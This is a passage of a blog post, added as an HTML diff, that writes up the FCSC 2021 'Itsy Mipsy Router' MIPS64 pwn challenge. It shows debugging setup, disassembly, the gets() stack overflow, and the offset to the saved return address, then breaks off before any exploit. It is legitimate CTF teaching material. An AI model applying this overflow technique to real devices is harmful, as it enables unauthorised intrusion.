+      title="All posts tagged with 'nasm'"
+    >
+      nasm
+    </a>
+  </span>
+
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/pwn/"
+      title="All posts tagged with 'pwn'"
+    >
+      pwn
+    </a>
+  </span>
+
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/ret2school/"
+      title="All posts tagged with 'ret2school'"
+    >
+      ret2school
+    </a>
+  </span>
+
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/2021/"
+      title="All posts tagged with '2021'"
+    >
+      2021
+    </a>
+  </span>
+
+      
+    
+    
+  
+
+
+
+
+
+
+        </div>
+      
+    </header>
+    <section class="gblog-markdown">
+      <div class="gblog-post__anchorwrap">
+    <h1 id="itsy-mipsy-router-200-pts">
+        Itsy Mipsy Router (200 pts)
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#itsy-mipsy-router-200-pts" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Itsy Mipsy Router (200 pts)" href="#itsy-mipsy-router-200-pts">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<p>Itsy Mipsy Router is a pwn challenge I did during the <a
+  class="gblog-markdown__link"
+  href="https://www.france-cybersecurity-challenge.fr"
+  
+  >FCSC event</a
+>.
+It&rsquo;s not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="setup">
+        Setup
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#setup" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Setup" href="#setup">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>So basically we got this:</p>
+<blockquote>
+<p>On vous demander d&rsquo;auditer un routeur à l&rsquo;interface entre Internet et un réseau interne d&rsquo;une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP.
+nc challenges2.france-cybersecurity-challenge.fr 4005</p>
+</blockquote>
+<p>And for debugging purposes administrators provided a Docker file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">FROM debian:buster-slim
+RUN apt update
+RUN apt install -yq socat qemu-user libc6-mips64-cross
+RUN apt clean
+RUN rm -rf /var/lib/apt/lists/
+
+WORKDIR /app
+COPY ./mipsy ./
+RUN rm /etc/ld.so.cache
+
+EXPOSE <span class="m">4000</span>
+EXPOSE <span class="m">1234</span>
+CMD socat tcp-listen:4000,reuseaddr,fork exec:<span class="s2">&#34;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&#34;</span>
+</code></pre></div><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ uname -a
+Linux off 5.8.0-50-generic <span class="c1">#56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+$ sudo apt install socat qemu-user libc6-mips64-cross
+Lecture des listes de paquets... Fait
+Construction de l<span class="s1">&#39;arbre des dépendances       
+</span><span class="s1">Lecture des informations d&#39;</span>état... Fait
+socat est déjà la version la plus récente <span class="o">(</span>1.7.3.3-2<span class="o">)</span>.
+libc6-mips64-cross est déjà la version la plus récente <span class="o">(</span>2.30-0ubuntu2cross2<span class="o">)</span>.
+qemu-user est déjà la version la plus récente <span class="o">(</span>1:4.2-3ubuntu6.15<span class="o">)</span>.
+<span class="m">0</span> mis à jour, <span class="m">0</span> nouvellement installés, <span class="m">0</span> à enlever et <span class="m">17</span> non mis à jour.
+$ sudo rm -f /etc/ld.so.cache
+$ socat tcp-listen:4000,reuseaddr,fork exec:<span class="s2">&#34;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&#34;</span>
+</code></pre></div><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ gdb-multiarch -ex <span class="s1">&#39;source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py&#39;</span> -q ./mipsy
+Reading symbols from ./mipsy...
+<span class="o">(</span>No debugging symbols found in ./mipsy<span class="o">)</span>
+pwndbg: loaded <span class="m">196</span> commands. Type pwndbg <span class="o">[</span>filter<span class="o">]</span> <span class="k">for</span> a list.
+pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
+pwndbg&gt; target remote localhost:5445
+
+</code></pre></div><p>To send the payload  I used <a
+  class="gblog-markdown__link"
+  href="https://github.com/Gallopsled/pwntools"
+  
+  >pwntools</a
+>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="c1"># return remote(&#34;challenges2.france-cybersecurity-challenge.fr&#34;, 4005)</span>
+    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</code></pre></div><p>Now we launch the python script to trigger the socat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 wu.py                                                               
+<span class="o">[</span>+<span class="o">]</span> Opening connection to localhost on port 4000: Done
+</code></pre></div><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">Remote debugging using localhost:5445
+warning: Unable to find dynamic linker breakpoint <span class="k">function</span>.
+GDB will be unable to debug shared library initializers
+and track explicitly loaded dynamic code.
+0x00000040008038d0 in ?? <span class="o">()</span>
+Could not check ASLR: Couldn<span class="s1">&#39;t get personality
+</span><span class="s1">Downloading &#39;</span>/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy<span class="s1">&#39; from the remote server: OK
+</span><span class="s1">add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
+</span><span class="s1">&#39;</span>context<span class="s1">&#39;: Print out the current register, instruction, and stack context.
+</span><span class="s1">Exception occurred: context: unsupported operand type(s) for +: &#39;</span>NoneType<span class="s1">&#39; and &#39;</span>int<span class="s1">&#39; (&lt;class &#39;</span>TypeError<span class="err">&#39;</span>&gt;<span class="o">)</span>
+For more info invoke <span class="sb">`</span><span class="nb">set</span> exception-verbose on<span class="sb">`</span> and rerun the <span class="nb">command</span>
+or debug it by yourself with <span class="sb">`</span><span class="nb">set</span> exception-debugger on<span class="sb">`</span>
+pwndbg&gt; vmmap
+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+       0x120000000        0x12002e000 r-xp    2e000 <span class="m">0</span>      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+       0x12002e000        0x12003d000 ---p     f000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+       0x12003d000        0x120040000 r--p     <span class="m">3000</span> 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+       0x120040000        0x120043000 rw-p     <span class="m">3000</span> <span class="m">30000</span>  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+      0x4000403000       0x4000828000 r--p   <span class="m">425000</span> <span class="m">0</span>      &lt;explored&gt;
+      0x40007fe000       0x4000801000 rw-p     <span class="m">3000</span> <span class="m">0</span>      <span class="o">[</span>stack<span class="o">]</span>
+
+<span class="o">[</span>QEMU target detected - vmmap result might not be accurate<span class="p">;</span> see <span class="sb">`</span><span class="nb">help</span> vmmap<span class="sb">`</span><span class="o">]</span>
+pwndbg&gt; <span class="k">continue</span>
+Continuing.
+warning: Could not load shared library symbols <span class="k">for</span> <span class="m">2</span> libraries, e.g. /lib/libc.so.6.
+Use the <span class="s2">&#34;info sharedlibrary&#34;</span> <span class="nb">command</span> to see the <span class="nb">complete</span> listing.
+Do you need <span class="s2">&#34;set solib-search-path&#34;</span> or <span class="s2">&#34;set sysroot&#34;</span>?
+<span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 1<span class="o">)</span> exited normally<span class="o">]</span>
+</code></pre></div><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">+---------------------------------+
+<span class="p">|</span>/                               <span class="se">\|</span>
+<span class="p">|</span>        ITSY MIPSY ROUTER        <span class="p">|</span>
+<span class="p">|</span><span class="se">\ </span>                              /<span class="p">|</span>
++---------------------------------+
+
+Menu:
+  0. Quit.
+  1. Show network interfaces
+  2. Ping internal HTTP file server
+  3. Log in as admin
+
+<span class="o">[</span>guest@mipsy<span class="o">]</span> 
+</code></pre></div><p>We&rsquo;re able to debug properly our process !</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="reverse-engineering">
+        Reverse Engineering
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#reverse-engineering" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reverse Engineering" href="#reverse-engineering">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>We can take a look at the binary by running the file command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ file mipsy                                                                  
+mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld.so.1, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e20cf7872e96482095ce68e6d4d03806d5928de4, <span class="k">for</span> GNU/Linux 3.2.0, not stripped
+</code></pre></div><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">+---------------------------------+
+<span class="p">|</span>/                               <span class="se">\|</span>
+<span class="p">|</span>        ITSY MIPSY ROUTER        <span class="p">|</span>
+<span class="p">|</span><span class="se">\ </span>                              /<span class="p">|</span>
++---------------------------------+
+
+Menu:
+  0. Quit.
+  1. Show network interfaces
+  2. Ping internal HTTP file server
+  3. Log in as admin
+
+<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">1</span>
+The router has the following network interfaces:
+* lo
+* eth0
+* eth2
+* eth1
+
+Menu:
+  0. Quit.
+  1. Show network interfaces
+  2. Ping internal HTTP file server
+  3. Log in as admin
+
+<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">2</span>
+Success: HTTP file server is up!
+
+Menu:
+  0. Quit.
+  1. Show network interfaces
+  2. Ping internal HTTP file server
+  3. Log in as admin
+
+<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">3</span>
+Input your password:
+&gt;&gt;&gt; l3eT_p4sS
+Error: wrong password.
+
+Menu:
+  0. Quit.
+  1. Show network interfaces
+  2. Ping internal HTTP file server
+  3. Log in as admin
+
+<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">0</span>
+</code></pre></div><p>It doesn&rsquo;t give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the &ldquo;Login as admin&rdquo; feature. The assembly code of this function looks like such:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.globl</span> <span class="no">authenticate</span>
+<span class="nl">authenticate:</span>
+
+<span class="nf">var_40</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
+<span class="nf">var_18</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x18</span>
+<span class="nf">var_10</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x10</span>
+<span class="nf">ret_addr</span><span class="err">=</span> <span class="p">-</span><span class="mi">8</span>
+
+<span class="nf">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="p">-</span><span class="mi">0x90</span>       <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">sd</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">sd</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">sd</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$fp</span><span class="p">,</span> <span class="no">$sp</span>
+<span class="nf">lui</span>     <span class="no">$gp</span><span class="p">,</span> <span class="mi">4</span>           <span class="c">; Load Upper Immediate
+</span><span class="c"></span><span class="no">daddu</span>   <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>         <span class="c">; Doubleword Add Unsigned
+</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x3AA4</span>      <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aInputYourPassw</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;Input your password:&#34;
+</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">puts</span>        <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; puts       ; Jump And Link Register
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">asc_120025B00</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;&gt;&gt;&gt; &#34;
+</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">printf</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; printf     ; Jump And Link Register
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">stdout</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">ld</span>      <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">stdout</span> <span class="p">-</span> <span class="mi">0x120042BC8</span><span class="p">)(</span><span class="no">$v0</span><span class="p">)</span>  <span class="c">; Load Doubleword
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; stream
+</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">fflush</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; fflush     ; Jump And Link Register
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>
+<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">gets</span>        <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; gets       ; Jump And Link Register
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">li</span>      <span class="no">$a2</span><span class="p">,</span> <span class="mi">0x20</span>  <span class="c">; &#39; &#39;  ; n
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; c
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; s
+</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">memset</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; memset     ; Jump And Link Register
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c">; s
+</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">strlen</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; strlen     ; Jump And Link Register
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$v1</span>
+<span class="nf">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>
+<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">kdf</span>         <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">bal</span>     <span class="no">kdf</span>              <span class="c">; Branch Always and Link
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
+</span><span class="c"></span><span class="no">li</span>      <span class="no">$a2</span><span class="p">,</span> <span class="mi">0x20</span>  <span class="c">; &#39; &#39;  ; n
+</span><span class="c"></span><span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
+</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">unk_120025B08</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; s2
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; s1
+</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">memcmp</span>      <span class="c">; Load 64-bit address
+</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
+<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; memcmp     ; Jump And Link Register
+</span><span class="c"></span><span class="no">nop</span>
+<span class="nf">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004688</span>  <span class="err">;</span> <span class="no">Branch</span> <span class="no">on</span> <span class="no">Not</span> <span class="no">Zero</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>When I began this challenge I didn&rsquo;t know anything about mips64 assembly but thanks to auto comments in IDA and to <a
+  class="gblog-markdown__link"
+  href="http://math-atlas.sourceforge.net/devel/assembly/mips-iv.pdf"
+  
+  >this</a
+> and <a
+  class="gblog-markdown__link"
+  href="https://write.lain.faith/~/Haskal/mips-rop/"
+  
+  >this</a
+>, I understood very quickly the main components of the architecture. And that&rsquo;s why I noticed a call to the <code>gets</code> function which as it&rsquo;s known read an arbitrary number of bytes from stdin to the buffer indicated in argument, and so in our case in <code>$fp</code>, which is initialized to <code>$sp-0x90</code>. Next the call to <code>gets</code>, <code>printf</code> and <code>fflush</code>, it calls <code>memset</code> to set every bytes of another buffer allocated next to our input to zero. Then it computes the length of our input and calls the <code>kdf</code> function with the following arguments: <code>kdf(char *input_password, int input_length, unsigned char *out)</code>. The kdf function is basically doing some encryption operations according to our input and its length and stores the result in the third argument.
+And the result of this encryption routine is compared to a constant value with <code>memcmp</code>.</p>
+<p>So we discovered the stack based buffer overflow which allows us to overwrite the saved instruction pointer saved at the functions&rsquo;s prologue.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="exploitation">
+        Exploitation
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Since we understood the vulnerable function, we can represent the stackframe like that:</p>
+<pre tabindex="0"><code>$saved_fp-0x90+----------------------+
+              |                      |
+              |                      |
+              |   buffer_password    |
+              |                      |
+              |                      |
+$saved_fp-0x40+----------------------+
+              |                      |
+              |                      |
+              |         out          |
+              |                      |
+$saved_fp-0x16+----------------------+
+              |       saved_gp       |
+$saved_fp-0x10+----------------------+
+              |       saved_fp       |
+   $saved_fp-8+----------------------+
+              |       saved_ra       |
+     $saved_fp+----------------------+
+              |                      |
+              |  calling function's  |
+              |      stackframe      |
+              |                      |
+              |                      |
+              +----------------------+
+</code></pre><p>And so, according to this schema, we overwrite the saved <code>$ra</code> from a padding of <code>0x90-0x8=0x88</code> bytes.
+But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of technique we want to use.</p>
+<div class="gblog-post__anchorwrap">
+    <h4 id="one-gadget-">
+        One gadget ?
+        <a data-clipboard-text="http://n4sm.github.io/posts/mipsy/#one-gadget-" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor One gadget ?" href="#one-gadget-">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h4>
+</div>
+<p>For an obsure reason, I thought the <code>gets</code> function had for badchar the NULL byte, so I was looking for a one gadget in the binary.</p>
+<p>I discovered during the reverse engineering part an interesting snippet of code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
